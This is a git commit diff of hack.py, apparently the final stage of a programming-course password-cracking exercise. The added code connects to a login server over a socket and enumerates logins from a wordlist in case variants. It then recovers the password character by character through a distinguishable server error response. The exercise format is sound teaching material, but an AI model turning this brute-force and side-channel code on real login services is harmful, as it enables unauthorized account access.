3b7979e7e9f1ff348e2c2563a45c3f17f37f1033
bestolochina <144358841+bestolochina@users.noreply.github.com>
2024-04-03 20:22:49 +0700

    Add files via upload
    stage 5/5

--- hack.py
+++ hack.py
@@ -1,6 +1,8 @@
+import logging
 import socket
 import sys
 import json
+import string
 from itertools import product
 
 
@@ -9,33 +11,61 @@ class PasswordHacker:
         self.hostname: str = hostname
         self.port: int = port
         self.address: tuple[str, int] = (self.hostname, self.port)
-        self.login_file: str = 'logins.txt'
+        self.login_file: str = r'hacking\logins.txt'
         self.login: str = ''
         self.password: str = ''
+        logging.basicConfig(filename=r'hacking\newfile.log',
+                            format='%(asctime)s %(message)s',
+                            filemode='w')
+        self.logger: logging.Logger = logging.getLogger()
+        self.logger.setLevel(logging.DEBUG)
 
     def start(self):
-        self.find_login()
-        self.find_password()
-        self.print_output()
+        with socket.socket() as self.my_socket:
+            self.my_socket.connect(self.address)
+            self.find_login()
+            self.find_password()
+            self.print_output()
 
     def find_login(self):
-        with socket.socket() as my_socket, open(self.login_file) as file:
+        self.logger.debug("Start self.find_login()")
+        with open(self.login_file) as file:
             password = '1'
-            my_socket.connect(self.address)
             for line in file:
                 line = line.strip()
                 for login in map(lambda x: ''.join(x), product(*([letter.lower(), letter.upper()] for letter in line))):
-                    my_socket.send(json.dumps({'login': login, 'password': password}).encode())
-                    response = json.loads(my_socket.recv(1024).decode())
+                    self.my_socket.send(json.dumps({'login': login, 'password': password}).encode())
+                    response = json.loads(self.my_socket.recv(1024).decode())
                     if response['result'] == 'Wrong password!':
                         self.login = login
+                        self.logger.debug(f"Found the login - {self.login}")
                         return
 
     def find_password(self):
-        pass
+        self.logger.debug("Start self.find_password()")
+        symbols: str = string.ascii_letters + string.digits + string.punctuation
+        password = ''
+        while not self.password:
+            for letter in symbols:
+                # self.logger.debug(f"Try the letter - {letter}")
+                my_json_data: str = json.dumps({'login': self.login, 'password': (password + letter)})
+                self.my_socket.send(my_json_data.encode())
+                response = json.loads(self.my_socket.recv(1024).decode())
+                if response['result'] == 'Wrong password!':
+                    # self.logger.debug(f"No...")
+                    continue
+                elif response['result'] == 'Exception happened during login':
+                    password += letter
+                    self.logger.debug(f"Exception happened when we sent - {password} !!!")
+                    break
+                elif response['result'] == 'Connection success!':
+                    self.password = password + letter
+                    self.logger.debug(f"Success - the password is  - {self.password} !!!!")
+                    break
 
     def print_output(self):
-        raise NotImplementedError
+        output = json.dumps({"login": self.login, "password": self.password})
+        print(output)
 
 
 def main() -> None:
